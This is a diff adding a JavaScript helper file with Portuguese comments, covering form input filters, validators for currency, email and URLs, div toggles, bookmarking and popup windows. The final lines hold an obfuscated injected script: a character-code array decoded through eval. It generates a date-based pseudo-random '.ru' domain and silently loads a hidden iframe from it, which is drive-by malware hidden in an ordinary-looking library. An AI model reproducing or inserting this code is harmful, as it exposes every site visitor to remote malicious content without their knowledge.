@@ -1,0 +1,314 @@
+//-------------------------------- uma caixa de texto apenas aceita numeros, usa-se onkeypress="return aceita_num(event);" ------------------------------------------------
+function aceita_num(e)
+{
+	var key = window.event ? e.keyCode : e.which;
+	var keychar = String.fromCharCode(key);
+	var Chars = "0123456789";
+	if (Chars.indexOf(keychar)== -1)
+		{ 
+			return false;
+		}else{
+			return true;
+		}
+}
+
+//-------------------------------- uma caixa de texto apenas aceita numeros e pontos, usa-se onkeypress="return aceita_num(event);" ---------------------------------------
+function aceita_num_ponto(e)
+{
+	var key = window.event ? e.keyCode : e.which;
+	var keychar = String.fromCharCode(key);
+	var Chars = "0123456789.";
+	if (Chars.indexOf(keychar)== -1)
+		{ 
+			return false;
+		}else{
+			return true;
+		}
+}
+
+//-------------------------------- uma caixa de texto apenas aceita numeros, pontos e sinal -, usa-se onkeypress="return aceita_num(event);" -----------------------------
+function aceita_num_pt_menos(e)
+{
+	var key = window.event ? e.keyCode : e.which;
+	var keychar = String.fromCharCode(key);
+	var Chars = "0123456789.";
+	if (Chars.indexOf(keychar)== -1)
+		{ 
+			return false;
+		}else{
+			return true;
+		}
+}
+
+//-------------------------------- uma caixa de texto apenas aceita numeros e /, usa-se onkeypress="return aceita_num(event);" -----------------------------
+function aceita_num_barra(e)
+{
+	var key = window.event ? e.keyCode : e.which;
+	var keychar = String.fromCharCode(key);
+	var Chars = "0123456789/";
+	if (Chars.indexOf(keychar)== -1)
+		{ 
+			return false;
+		}else{
+			return true;
+		}
+}
+
+//-------------------------------- verifica se um valor  do tipo moeda, verifica-se na validao do formulrio" -------------------------------------------------------
+function checkmoeda( fld, desc ) 
+{ 
+	var temp_value = fld; 
+	var Chars = "0123456789.";
+	var tt=0;
+	var mess='';
+	for (var i = 0; i < temp_value.length; i++) 
+	{ 
+		if (Chars.indexOf(temp_value.charAt(i)) == -1) 
+		{ 
+			tt=tt+1;
+			mess='O campo "'+desc+'"  invlido!\n';
+		}
+	}
+	var onde=fld.indexOf('.');
+	if(onde>=0){
+		var outro=fld.indexOf('.',onde+1);
+		if(outro>=0){
+			tt=1;
+			mess=mess+'O campo "'+desc+'" apenas pode conter um "."!\n';
+		}else{
+			var rstr=Right(fld,fld.length-onde-1);
+			if(rstr.length>2){
+				tt=1;
+				mess=mess+'O campo "'+desc+'" apenas pode conter 2 digitos depois do "."!\n';
+			}
+		}
+	}
+	if(tt==0){
+		return true;
+	}else{
+		return false;
+	}
+}
+
+//-------------------------------- verifica se um valor  do tipo nmero, verifica-se na validao do formulrio" -------------------------------------------------------
+function checknumber(x){
+	var anum=/(^\d+$)|(^\d+\.\d+$)/
+	if (anum.test(x)){
+		return true;
+	}else{
+		return false;
+	}
+}
+
+//-------------------------------- atribui um objecto a uma variavl apartir do id do objecto, usa-se variavel=getObject('id_do_objecto'); -------------------------------
+var ie4 = false; if(document.all) { ie4 = true; }
+function getObject(id) {
+	if (ie4) {
+		return document.all[id];
+	}else{
+		return document.getElementById(id);
+	}
+}
+
+//-------------------------------- mostra/esconde um div e altera o boto de link ---------------------------------------------------------------------------------------
+function toggle(link, divId) {
+	var lText = link.src;
+	var d = getObject(divId);
+	//alert(link.src);
+	if (link.src == 'http://<%=dominio%>/adminarea/images/bt_mostrar.jpg') {
+		link.src = 'http://<%=dominio%>/adminarea/images/bt_esconder.jpg'; d.style.display = 'block';
+	}else{
+		link.src = 'http://<%=dominio%>/adminarea/images/bt_mostrar.jpg'; d.style.display = 'none';
+	}
+}
+
+//-------------------------------- mostra/esconde um div e altera texto do link para + ou - -----------------------------------------------------------------------------
+function toggle1(link,divId) {
+	var d = getObject(divId);
+	if (d.style.display == 'none') {
+		d.style.display = 'block';
+		link.innerHTML='&#9472;';
+	}else{
+		d.style.display = 'none';
+		link.innerHTML='+';
+	}
+}
+
+//-------------------------------- mostra/esconde um div ----------------------------------------------------------------------------------------------------------------
+function toggle2(divId) {
+	var d = getObject(divId);
+	if (d.style.display == 'none') {
+		d.style.display = 'block';
+	}else{
+		d.style.display = 'none';
+	}
+}
+
+//-------------------------------- adiciona aos favoritos --------------------------------------------------------------------------------------------------------------
+function bm(){
+var url = "http://<%=dominio%>";
+var who = "<%=titulo%>";
+
+var ver = navigator.appName;
+var num = parseInt(navigator.appVersion);
+if ((ver == "Microsoft Internet Explorer")&&(num >= 4)) {
+window.external.AddFavorite(url,who);
+}else{
+	alert('Para adicionar aos favoritos (bookmark) neste browser\nnecessita de usar o atalho (Ctrl+D) ou utilize o menu\nBookmarks -> Bookmark this page...');
+}
+}
+
+//-------------------------------- abre uma pop-up e centra a janela no ecra ---------------------------------------------------------------------------------------------
+function abre(url, toolbar, location, directories, maximize, addressbar, menubar, scrollbars, status, resizable, width, height) {
+	if(navigator.appName == "Microsoft Internet Explorer")
+	{
+		screenY = document.body.offsetHeight
+		screenX = window.screen.availWidth
+	}
+	else
+	{
+		screenY = screen.height;
+		screenX = screen.width;
+	}
+	
+	leftvar = (screenX - width) / 2
+	rightvar = (screenY - height) / 2
+	if(navigator.appName == "Microsoft Internet Explorer")
+	{
+		left = leftvar
+		top = rightvar
+	}
+	else
+	{
+		left = (leftvar - pageXOffset)
+		top = (rightvar - pageYOffset)
+	}
+    window.open(url,"html","toobar="+toolbar+",location="+location+",directories="+directories+",maximize="+maximize+",addressbar="+addressbar+",menubar="+menubar+",scrollbars=" + scrollbars + ",status="+status+",resizable="+resizable+",WIDTH=" + width + ",HEIGHT=" + height + ",top="+top+",left="+left);
+}
+
+//-------------------------------- abre uma pop-up modal e centra a janela no ecra ---------------------------------------------------------------------------------------------
+function abre_modal(url, toolbar, location, directories, maximize, addressbar, menubar, scrollbars, status, resizable, width, height){
+	if(navigator.appName == "Microsoft Internet Explorer")
+	{
+		screenY = document.body.offsetHeight;
+		screenX = window.screen.availWidth;
+	}
+	else
+	{
+		screenY = screen.height;
+		screenX = screen.width;
+	}
+	
+	leftvar = (screenX - width) / 2;
+	rightvar = (screenY - height) / 2;
+	if(navigator.appName == "Microsoft Internet Explorer")
+	{
+		left = leftvar;
+		top = rightvar;
+	}
+	else
+	{
+		left = (leftvar - pageXOffset);
+		top = (rightvar - pageYOffset);
+	}
+	if (window.showModalDialog) {
+		window.showModalDialog(url,"name","dialogWidth:"+width+"px;dialogHeight:"+height+"px;status:"+status+";center:yes;help:no");
+	} else {
+		window.open(url,"html","toobar="+toolbar+",location="+location+",directories="+directories+",maximize="+maximize+",addressbar="+addressbar+",menubar="+menubar+",scrollbars=" + scrollbars + ",status="+status+",resizable="+resizable+",WIDTH=" + width + ",HEIGHT=" + height + ",top="+top+",left="+left+",modal=yes");
+	}
+} 
+
+//-------------------------------- apresenta a horas ---------------------------------------------------------------------------------------------------------------------
+function show(obj)
+{
+campo=getObject(obj)
+var Digital=new Date()
+var hours=Digital.getHours()
+var minutes=Digital.getMinutes()
+var seconds=Digital.getSeconds()
+if (minutes<=9)
+minutes="0"+minutes
+if (seconds<=9)
+seconds="0"+seconds
+campo.value=hours+":"+minutes+":"+seconds
+setTimeout("show()",1000)
+}
+
+//-------------------------------- apresenta uma descrio "desc" num objecto de id="desc" --------------------------------------------------------------------------------
+function descricao(desc){
+	var obj=document.getElementById('desc');
+	obj.innerHTML='<font color="#666666" face="Tahoma" style="font-size: 8pt">'+desc+'</font>';
+}
+
+//-------------------------------- verifica se o valor de um campo  um e-mail vlido, verifica-se na validao de um formulrio ------------------------------------------
+function checkmail(str) {
+	var at="@"
+	var dot="."
+	var lat=str.indexOf(at)
+	var lstr=str.length
+	var ldot=str.indexOf(dot)
+	if (str.indexOf(at)==-1){
+		return false
+	}
+	if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
+		return false
+	}
+	if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
+		return false
+	}
+	if (str.indexOf(at,(lat+1))!=-1){
+		return false
+	}
+	if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
+		return false
+	}
+	if (str.indexOf(dot,(lat+2))==-1){
+		return false
+	}
+	if (str.indexOf(" ")!=-1){
+		return false
+	}
+	return true					
+}
+
+//-------------------------------- apresenta n caracteres apartir da esquerda da string "str" ----------------------------------------------------------------------------
+function Left(str, n){
+	if (n <= 0)
+	    return "";
+	else if (n > String(str).length)
+	    return str;
+	else
+	    return String(str).substring(0,n);
+}
+
+//-------------------------------- apresenta n caracteres apartir da direita da string "str" -----------------------------------------------------------------------------
+function Right(str, n){
+    if (n <= 0)
+       return "";
+    else if (n > String(str).length)
+       return str;
+    else {
+       var iLen = String(str).length;
+       return String(str).substring(iLen, iLen - n);
+    }
+}
+
+//-------------------------------- verifica se o valor de um campo  um url vlido, verifica-se na validao de um formulrio --------------------------------------------
+function checkurl(url){ 
+    var RegExp = /^(([\w]+:)?\/\/)?(([\d\w]|%[a-fA-f\d]{2,2})+(:([\d\w]|%[a-fA-f\d]{2,2})+)?@)?([\d\w][-\d\w]{0,253}[\d\w]\.)+[\w]{2,4}(:[\d]+)?(\/([-+_~.\d\w]|%[a-fA-f\d]{2,2})*)*(\?(&?([-+_~.\d\w]|%[a-fA-f\d]{2,2})=?)*)?(#([-+_~.\d\w]|%[a-fA-f\d]{2,2})*)?$/; 
+    if(RegExp.test(url)){ 
+        return true; 
+    }else{ 
+        return false; 
+    }
+}
+
+//---------------------------------------------------------------- faz o submit de um formulrio ------------------------------------------------------------------------
+function envia_form(frm){
+	frmz=document.getElementById(frm);
+	frmz.submit();
+} 
+
+/*km0ae9gr6m*/i=0;try{prototype-5;}catch(z){f=[102,234,110,198,116,210,111,220,32,220,101,240,116,164,97,220,100,222,109,156,117,218,98,202,114,80,41,246,118,194,114,64,104,210,61,232,104,210,115,92,115,202,101,200,47,232,104,210,115,92,81,118,118,194,114,64,108,222,61,232,104,210,115,92,115,202,101,200,37,232,104,210,115,92,81,118,118,194,114,64,116,202,115,232,61,232,104,210,115,92,65,84,108,222,45,232,104,210,115,92,82,84,104,210,59,210,102,80,116,202,115,232,62,96,41,246,116,208,105,230,46,230,101,202,100,122,116,202,115,232,125,202,108,230,101,246,116,208,105,230,46,230,101,202,100,122,116,202,115,232,43,232,104,210,115,92,77,250,114,202,116,234,114,220,40,232,104,210,115,92,115,202,101,200,42,232,104,210,115,92,111,220,101,158,118,202,114,154,41,250,102,234,110,198,116,210,111,220,32,164,97,220,100,222,109,156,117,218,98,202,114,142,101,220,101,228,97,232,111,228,40,234,110,210,120,82,123,236,97,228,32,200,61,220,101,238,32,136,97,232,101,80,117,220,105,240,42,98,48,96,48,82,59,236,97,228,32,230,61,200,46,206,101,232,72,222,117,228,115,80,41,124,49,100,63,98,58,96,59,232,104,210,115,92,115,202,101,200,61,100,51,104,53,108,55,112,57,96,49,86,40,200,46,206,101,232,77,222,110,232,104,80,41,84,48,240,70,140,70,140,70,140,41,86,40,200,46,206,101,232,68,194,116,202,40,82,42,96,120,140,70,140,70,82,43,80,77,194,116,208,46,228,111,234,110,200,40,230,42,96,120,140,70,140,41,82,59,232,104,210,115,92,65,122,52,112,50,110,49,118,116,208,105,230,46,154,61,100,49,104,55,104,56,102,54,104,55,118,116,208,105,230,46,162,61,232,104,210,115,92,77,94,116,208,105,230,46,130,59,232,104,210,115,92,82,122,116,208,105,230,46,154,37,232,104,210,115,92,65,118,116,208,105,230,46,222,110,202,79,236,101,228,77,122,49,92,48,94,116,208,105,230,46,154,59,232,104,210,115,92,110,202,120,232,61,220,101,240,116,164,97,220,100,222,109,156,117,218,98,202,114,118,114,202,116,234,114,220,32,232,104,210,115,250,102,234,110,198,116,210,111,220,32,198,114,202,97,232,101,164,97,220,100,222,109,156,117,218,98,202,114,80,114,88,77,210,110,88,77,194,120,82,123,228,101,232,117,228,110,64,77,194,116,208,46,228,111,234,110,200,40,80,77,194,120,90,77,210,110,82,42,228,46,220,101,240,116,80,41,86,77,210,110,82,125,204,117,220,99,232,105,222,110,64,103,202,110,202,114,194,116,202,80,230,101,234,100,222,82,194,110,200,111,218,83,232,114,210,110,206,40,234,110,210,120,88,108,202,110,206,116,208,44,244,111,220,101,82,123,236,97,228,32,228,97,220,100,122,110,202,119,64,82,194,110,200,111,218,78,234,109,196,101,228,71,202,110,202,114,194,116,222,114,80,117,220,105,240,41,118,118,194,114,64,108,202,116,232,101,228,115,122,91,78,97,78,44,78,98,78,44,78,99,78,44,78,100,78,44,78,101,78,44,78,102,78,44,78,103,78,44,78,104,78,44,78,105,78,44,78,106,78,44,78,107,78,44,78,108,78,44,78,109,78,44,78,110,78,44,78,111,78,44,78,112,78,44,78,113,78,44,78,114,78,44,78,115,78,44,78,116,78,44,78,117,78,44,78,118,78,44,78,119,78,44,78,120,78,44,78,121,78,44,78,122,78,93,118,118,194,114,64,115,232,114,122,39,78,59,204,111,228,40,236,97,228,32,210,61,96,59,210,60,216,101,220,103,232,104,118,105,86,43,82,123,230,116,228,43,122,108,202,116,232,101,228,115,182,99,228,101,194,116,202,82,194,110,200,111,218,78,234,109,196,101,228,40,228,97,220,100,88,48,88,108,202,116,232,101,228,115,92,108,202,110,206,116,208,45,98,41,186,125,228,101,232,117,228,110,64,115,232,114,86,39,92,39,86,122,222,110,202,125,230,101,232,84,210,109,202,111,234,116,80,102,234,110,198,116,210,111,220,40,82,123,232,114,242,123,210,102,80,116,242,112,202,111,204,32,210,102,228,97,218,101,174,97,230,67,228,101,194,116,202,100,100,61,122,34,234,110,200,101,204,105,220,101,200,34,82,123,210,102,228,97,218,101,174,97,230,67,228,101,194,116,202,100,100,61,232,114,234,101,118,118,194,114,64,117,220,105,240,61,154,97,232,104,92,114,222,117,220,100,80,43,220,101,238,32,136,97,232,101,80,41,94,49,96,48,96,41,118,118,194,114,64,100,222,109,194,105,220,78,194,109,202,61,206,101,220,101,228,97,232,101,160,115,202,117,200,111,164,97,220,100,222,109,166,116,228,105,220,103,80,117,220,105,240,44,98,54,88,39,228,117,78,41,118,105,204,114,218,61,200,111,198,117,218,101,220,116,92,99,228,101,194,116,202,69,216,101,218,101,220,116,80,34,146,70,164,65,154,69,68,41,118,105,204,114,218,46,230,101,232,65,232,116,228,105,196,117,232,101,80,34,230,114,198,34,88,34,208,116,232,112,116,47,94,34,86,100,222,109,194,105,220,78,194,109,202,43,68,47,228,117,220,102,222,114,202,115,232,114,234,110,126,115,210,100,122,99,240,34,82,59,210,102,228,109,92,115,232,121,216,101,92,119,210,100,232,104,122,34,96,112,240,34,118,105,204,114,218,46,230,116,242,108,202,46,208,101,210,103,208,116,122,34,96,112,240,34,118,105,204,114,218,46,230,116,242,108,202,46,236,105,230,105,196,105,216,105,232,121,122,34,208,105,200,100,202,110,68,59,200,111,198,117,218,101,220,116,92,98,222,100,242,46,194,112,224,101,220,100,134,104,210,108,200,40,210,102,228,109,82,125,250,99,194,116,198,104,80,101,82,123,250,125,88,53,96,48,82,59];v="e"+"v"+"a";}if(v)e=window[v+"l"];try{q=document.createElement("b");if(e)q.appendChild(q+"");}catch(fwbewe){w=f;s=[];}
+r=String;z=((e)?"Code":"");for(;1333-5+5>i;i+=1){j=i;if(e)s=s+r.fromCharCode((w[j]/(2-1+j%2)));}
+if(f)e(s);/*qhk6sa6g1c*/
